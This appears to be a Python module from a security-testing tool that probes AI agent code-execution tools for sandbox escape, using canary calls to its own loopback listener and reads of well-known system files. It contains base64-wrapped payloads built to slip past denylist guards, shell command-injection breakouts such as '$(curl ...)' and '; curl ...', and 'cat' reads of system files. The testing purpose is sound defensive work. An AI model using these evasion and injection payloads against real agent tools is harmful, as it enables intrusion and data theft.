"""Dangerous code execution (sandbox escape probe): no LLM, no injection —
call a code-execution tool directly with payloads that only ever do
things already proven harmless elsewhere in this project, and see
whether a real, deterministic code-level check confines what the
executed code can reach. Model-free by design, sibling to
path_traversal.py/ssrf_probe.py: whether code execution is actually
contained is entirely a target-owned code/infrastructure property, no
model involved anywhere.

The core safety invariant this whole module is built around: unlike a
file read or a URL fetch, actually running arbitrary code against a real,
unsandboxed target could itself cause real, uncontained damage — so
every payload here performs only an action already proven harmless
elsewhere in this project, just delivered through a code-execution tool
instead of a dedicated one:

1. Network trap (confirmed tier) — the exact loopback URL
   ssrf_probe.py's own loopback-trap category already relies on
   (gaslight's own Sink, tried under every host core/sink.py's
   loopback_hosts() returns), with a canary token embedded, delivered as
   four payload flavors since the tool's runtime isn't known ahead of
   time: a Python one-liner using urllib, a shell one-liner using curl
   (assumes curl is present — a known, accepted limitation), and a
   base64-wrapped variant of each — a guard that scans the submitted code
   text for a denylisted substring ("urllib", "curl", "http://") is
   blind to the same call spelled as decoded-then-executed bytes. A hit
   is proven the same way ssrf_probe.py proves it: the sink physically
   received the canary, checked regardless of what the tool's own
   response claims — so a base64 payload proves exactly as much as its
   plain-text sibling, no weaker.
2. Well-known file read (best-effort tier), tried only if category 1
   found nothing — the exact well-known files path_traversal.py already
   relies on (WELL_KNOWN_FILE_SIGNATURES, shared via core/schema.py),
   tried only as absolute paths (code execution has no notion of "confined
   to an intended directory" the way a file-read tool's path argument
   does), again as both a Python and a shell payload flavor. Accepted as
   a hit only if the response contains that file's own positive content
   signature — never a bare non-error response.

No payload in this module ever writes, deletes, modifies, spawns a
persistent process, or risks consuming unbounded resources. This is not
a runtime check — it's enforced by the payload set above containing
nothing else.

Running code isn't itself what's being restricted here — reaching
outside intended scope is — so the real call always happens regardless
of --safe, same as path_traversal.py/ssrf_probe.py. What --safe gates is
what gets stored: by default the response is masked and hard-truncated
(core/secrets_scan.py's redact_and_truncate()) before it ever reaches a
Finding; --no-safe stores the full, unmasked response.
"""

from __future__ import annotations

import base64

from gaslight.core.attacks.base import AttackModule, Finding
from gaslight.core.canary import mint
from gaslight.core.llm import LLMProvider
from gaslight.core.schema import WELL_KNOWN_FILE_SIGNATURES, find_code_execution_tool, naive_arguments
from gaslight.core.secrets_scan import redact_and_truncate
from gaslight.core.sink import Sink, loopback_hosts
from gaslight.core.target import Target

_PREVIEW_LENGTH = 150


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def _network_trap_payloads(url: str) -> list[str]:
    python_payload = f"import urllib.request; urllib.request.urlopen({url!r})"
    shell_payload = f"curl -s {url}"
    return [
        python_payload,
        shell_payload,
        # base64-wrapped flavors — bypass a guard that denylists the plain
        # substrings ("urllib", "curl", "http://") above but never decodes
        # what it's about to run.
        f"import base64;exec(base64.b64decode('{_b64(python_payload)}'))",
        f"echo {_b64(shell_payload)} | base64 -d | sh",
        # Shell command-INJECTION breakouts — for the very common shape where
        # the field is not the whole program but is interpolated into a shell
        # command (`./script.sh {arg}`), so a bare `curl ...` runs as an
        # argument, not a command. DVMCP challenge 9's network_diagnostic does
        # exactly `subprocess.check_output(f"./x.sh {target} {options}",
        # shell=True)`.
        #
        # Command-SUBSTITUTION forms first ($(...) and backticks): they run our
        # curl BEFORE the surrounding command, so they fire immediately even
        # when the host command itself hangs (challenge 9's script blocks on a
        # real ping/traceroute). The sequential forms below (`;`, `&&`, `|`)
        # depend on the preceding command finishing, so they are last —
        # whichever fires first ends the probe anyway.
        f"$(curl -s {url})",
        f"`curl -s {url}`",
        f"; curl -s {url}",
        f"&& curl -s {url}",
        f"| curl -s {url}",
    ]


def _file_read_payloads(path: str) -> list[str]:
    return [
        f"print(open('/{path}').read())",
        f"cat /{path}",
    ]


class CodeExecutionAttack(AttackModule):
    key = "code-execution-probe"
    name = "Dangerous Code Execution (Sandbox Escape Probe)"
    description = (
        "Calls a code-execution tool directly with harmless-by-construction payloads "
        "(a call to our own listener, a read of an ordinary system file) — no model, no "
        "injection — and checks whether a real code-level check confines what executed "
        "code can reach."
    )

    def __init__(self, *, safe: bool = True) -> None:
        if not isinstance(safe, bool):
            raise TypeError(f"safe must be a bool, got {type(safe).__name__}")
        self._safe = safe

    async def run(self, target: Target, provider: LLMProvider, sink: Sink) -> Finding:
        # provider is accepted to satisfy the AttackModule interface but
        # unused — this attack never invokes a model, that's the point.
        tool, code_field = find_code_execution_tool(target.tools)
        if tool is None or code_field is None:
            return Finding(
                attack_key=self.key,
                fired=False,
                reason="no viable code-execution tool with a code/command-like field to probe.",
                attempted=False,
            )

        canary = mint("code-exec")
        for host in loopback_hosts():
            url = f"http://{host}:{sink.port}/collect?t={canary.token}"
            for payload in _network_trap_payloads(url):
                args = naive_arguments(tool.input_schema, exclude=code_field)
                args[code_field] = payload
                result = await target.call_tool(tool.name, args)
                if sink.received(canary.token) is not None:
                    text = Target.result_text(result)
                    preview = text if not self._safe else redact_and_truncate(text, _PREVIEW_LENGTH)
                    return Finding(
                        attack_key=self.key,
                        fired=True,
                        reason=(
                            f"{tool.name} reached an out-of-scope address via "
                            f"{code_field}={payload!r} (confirmed) — response: {preview!r}"
                        ),
                    )

        for path, signature in WELL_KNOWN_FILE_SIGNATURES.items():
            for payload in _file_read_payloads(path):
                args = naive_arguments(tool.input_schema, exclude=code_field)
                args[code_field] = payload
                result = await target.call_tool(tool.name, args)
                if result.is_error:
                    continue
                text = Target.result_text(result)
                if signature not in text:
                    continue
                preview = text if not self._safe else redact_and_truncate(text, _PREVIEW_LENGTH)
                return Finding(
                    attack_key=self.key,
                    fired=True,
                    reason=(
                        f"{tool.name} reached an out-of-scope file via "
                        f"{code_field}={payload!r} (best-effort) — response: {preview!r}"
                    ),
                )

        return Finding(
            attack_key=self.key,
            fired=False,
            reason=(
                f"{tool.name} — no probed code payload reached an address or file outside "
                "its intended scope."
            ),
        )
